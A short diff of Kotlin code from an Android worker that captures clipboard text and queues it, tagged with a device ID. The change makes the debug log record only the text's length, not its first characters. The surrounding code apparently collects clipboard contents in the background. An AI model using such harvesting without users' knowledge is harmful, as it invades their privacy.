@@ -164,7 +164,7 @@ class OfflineCollectorWorker(
                         put("timestamp", System.currentTimeMillis())
                     }
                     queue.enqueue("clipboard", payload.toString(), AndroidConfig.deviceId)
-                    Log.d(TAG, "Clipboard snapshot: ${text.take(30)}...")
+                    Log.d(TAG, "Clipboard snapshot captured, length: ${text.length}")
                 }
             }
         } catch (e: Exception) {
